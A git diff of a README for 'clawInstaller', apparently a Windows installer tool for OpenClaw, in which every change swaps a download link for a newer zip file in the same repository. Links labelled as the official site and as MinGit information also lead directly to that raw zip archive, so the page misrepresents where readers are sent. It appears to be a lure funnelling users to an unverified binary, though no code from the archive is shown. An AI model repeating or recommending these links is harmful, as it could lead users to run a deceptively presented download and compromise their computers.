@@ -1,6 +1,6 @@
 # 🦞 clawInstaller - Easy Windows Deployment Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-clawInstaller-blueviolet)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw_Installer_v1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-clawInstaller-blueviolet)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)
 
 ---
 
@@ -50,7 +50,7 @@ clawInstaller focuses on convenience and reliability. Here are the main features
 
 ## 📥 Download & Installation
 
-[![Download Latest Release](https://img.shields.io/badge/Get_clawInstaller-Download-purple?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw_Installer_v1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Get_clawInstaller-Download-purple?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)
 
 1. Visit the release page above.
 
@@ -135,9 +135,9 @@ If you want more control:
 
 ## 📖 Useful Links
 
-- OpenClaw Official Site: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw_Installer_v1.3.zip  
+- OpenClaw Official Site: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip  
 - Node.js Portable Version: Included automatically  
-- MinGit Info: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw_Installer_v1.3.zip  
+- MinGit Info: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip  
 
 ---
 
@@ -147,4 +147,4 @@ clawInstaller is open-source software under the MIT License. You can use, modify
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download_clawInstaller-blue?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw_Installer_v1.3.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download_clawInstaller-blue?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)
